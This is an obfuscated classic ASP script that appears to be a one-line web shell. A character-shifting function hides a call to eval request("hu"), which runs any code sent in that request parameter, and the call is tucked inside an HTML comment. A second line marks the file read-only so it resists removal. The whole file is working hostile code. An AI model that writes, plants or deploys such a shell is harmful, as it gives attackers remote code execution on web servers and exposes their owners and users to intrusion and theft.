<%
<!--
Function VOTB(NDLR):
	NDLR = Split(NDLR,"}")
	For x=0 To Ubound(NDLR)
		VOTB=VOTB&Chr(NDLR(x)-230)
	Next
End Function
EXecutE(VOTB("331}348}327}338}262}344}331}343}347}331}345}346}270}264}334}347}264}271"))
-->
%>
<%:Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 33 then:f.attributes = 33:end if%>